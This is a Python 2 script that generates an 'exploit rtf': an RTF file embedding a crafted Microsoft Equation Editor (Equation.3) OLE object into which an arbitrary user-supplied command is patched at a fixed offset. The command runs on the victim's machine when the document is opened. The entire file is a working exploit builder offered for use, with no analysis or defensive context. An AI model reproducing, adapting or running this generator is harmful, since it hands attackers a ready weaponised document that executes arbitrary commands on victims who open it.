import argparse


RTF_HEADER = R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang9"""


RTF_TRAILER = R"""\par}
"""


OBJECT_HEADER = R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """


OBJECT_TRAILER = R"""
}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260
0100090000039e00000002001c0000000000050000000902000000000500000002010100000005
0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002
1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000
0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000
0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000
002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100
000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a
0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300
00000000
}}}
"""


OBJDATA_TEMPLATE = R"""
01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1
b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001
0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe
fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000
000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000
0000000000000000000000000000000000000000000000000000001400000000000000010043006f
006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000
00000000000000000000000000000000000000000000000000000000000000010000006600000000
00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000003
0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffff01000002080000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02
ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e
30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000
00000000000000000000000000000000000000000000000000000000000000000000000000030004
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4
ee5b0000000000030101030a0a01085a5a4141414141414141414141414141414141414141414141
414141414141414141414141414141414141414141120c4300000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000004500710075
006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000
0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000
0000000000000000000000000000000000000000000000000000000000000004000000c500000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000ff
ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000001050000050000000d0000004d
45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500
000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00
050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00
ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65
7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001
90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131
0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131
31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000
0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff
7cef1800040000002d01010004000000f0010000030000000000
"""


COMMAND_OFFSET = 0x949*2

def create_ole_exec_primitive(command):
    if len(command) > 43:
        raise ValueError("primitive command must be shorter than 43 bytes")
    hex_command = command.encode("hex")
    objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, "\r\n")
    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]
    return OBJECT_HEADER + ole_data + OBJECT_TRAILER


def create_rtf(header, trailer, command):
    ole1 = create_ole_exec_primitive(command + " &")
    return header + ole1 + trailer


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Document")
    parser.add_argument("-x", "--exe", help="Command or file to execute", required=True)
    parser.add_argument('-o', "--output", help="Output exploit rtf", required=True)

    args = parser.parse_args()

    rtf_content = create_rtf(RTF_HEADER, RTF_TRAILER, args.exe)

    output_file = open(args.output, "w")
    output_file.write(rtf_content)

    print "File " + args.output + " created."